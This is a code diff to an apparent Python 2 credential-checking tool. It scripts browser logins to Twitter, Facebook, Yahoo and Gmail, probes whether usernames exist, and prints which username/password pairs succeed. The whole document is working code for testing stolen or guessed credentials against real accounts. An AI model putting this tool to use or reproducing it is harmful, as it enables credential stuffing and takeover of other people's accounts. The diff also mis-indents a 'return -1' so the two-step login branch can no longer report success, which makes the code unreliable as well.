@@ -6,10 +6,15 @@ reload(sys)
 sys.setdefaultencoding('utf-8')
 
 SITES= {
-        "twitter":("http://twitter.com/login", 0,1,"session[username_or_email]","session[password]","https://twitter.com/search-home",1,"q","No results"),
+	"twitter":("http://twitter.com/login", 0,1,"session[username_or_email]","session[password]","https://twitter.com/search-home",1,"q","No results"),
 	"facebook":("http://www.facebook.com/login",0,0,"email","pass","https://m.facebook.com/login/identify",0,"email","try again"),
 	"yahoo":("http://login.yahoo.com",1,0,"username", "password"),
-	"gmail":("http://accounts.google.com/Login",1,0,"Email","Passwd")}
+	"gmail":("http://accounts.google.com/Login",1,0,"Email","Passwd")
+	}
+
+VERIFY = {
+	"check":("http://www.verifyemailaddress.org/",0,0,"email","not valid")
+	}
 
 class Login:
 	def __init__(self,username="", password=""):
@@ -39,32 +44,35 @@ class Login:
 		userfield = SITES[site][7]
 		error_str = SITES[site][8]
 
-		self.br.open(urllogin) # open twitter
+		self.br.open(urllogin) 
 		self.br.select_form(nr=numform) # select the form
 		self.br[userfield] = self.username
 		
 		self.br.submit() 
 		resp = self.br.response().read()
                 
-                if error_str in resp:
-                    return 0
-                else:
-                    return 1	
+		if error_str in resp:
+			return -1
+		else:
+			return 1	
 		
-	def login(self, site):
+	def login(self, site, user="", passw=""):
 		urllogin = SITES[site][0]
 		submits = SITES[site][1]
 		numform = SITES[site][2]
 		userfield = SITES[site][3]
 		pwfield = SITES[site][4]
-		success = 0
-
+		success = -1
+		
+		if(user != "" and passw != ""):
+			self.username = user
+			self.password = passw
 
 		if(submits == 0):
- 			chk = self.check_user(site,self.username)
-			if not chk:
-				print "\033[91m[-?]\033[0m","Username: \033[91m%s\033[0m Password: \033[91m%s\033[0m" % (self.username, self.password)
-				return 0
+			if self.check_user(site,self.username) == -1:
+				print "\033[91m[-?]\033[0m","\033[94m %s\033[0m, Username: \033[91m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
+				return -1
+		
 			self.cookies.clear()
 			self.br.open(urllogin) # open a site
 			self.br.select_form(nr = numform) # select the form
@@ -75,11 +83,11 @@ class Login:
 			page2 = [control.name for form in self.br.forms() for control in form.controls]
 		
 			if userfield in page2 and pwfield in page2:
-				success = 0
-				print "\033[91m[+-]\033[0m","Username: \033[92m%s\033[0m Password: \033[91m%s\033[0m" % (self.username, self.password)
+				success = -1
+				print "\033[91m[+-]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
 			else:
 				success = 1
-				print "\033[92m[++]\033[0m","Username: \033[92m%s\033[0m Password: \033[92m%s\033[0m" % (self.username, self.password)
+				print "\033[92m[++]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[92m%s\033[0m" % (site.title(),self.username, self.password)
 		
 			return success
 		else:
@@ -90,8 +98,8 @@ class Login:
 			page2 = [control.name for form in self.br.forms() for control in form.controls]
 
 			if pwfield not in page2:
-				print "\033[91m[-?]\033[0m","Username: \033[91m%s\033[0m Password: \033[91m%s\033[0m" % (self.username, self.password)
-				return 0
+				print "\033[91m[-?]\033[0m","\033[94m %s\033[0m, Username: \033[91m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
+				return -1
 			
 			self.br.select_form(nr = numform) # select the form
 			self.br[pwfield]= self.password
@@ -100,8 +108,8 @@ class Login:
 			page3 = [control.name for form in self.br.forms() for control in form.controls]
 
 			if pwfield in page3:
-				print "\033[91m[+-]\033[0m","Username: \033[92m%s\033[0m Password: \033[91m%s\033[0m" % (self.username, self.password)
-				return 0
+				print "\033[91m[+-]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[91m%s\033[0m" % (site.title(),self.username, self.password)
+			return -1
 			
-			print "\033[92m[++]\033[0m Username: \033[92m%s\033[0m Password: \033[92m%s\033[0m " % (self.username, self.password)
+			print "\033[92m[++]\033[0m","\033[94m %s\033[0m, Username: \033[92m%s\033[0m Password: \033[92m%s\033[0m " % (site.title(),self.username, self.password)
 			return 1	
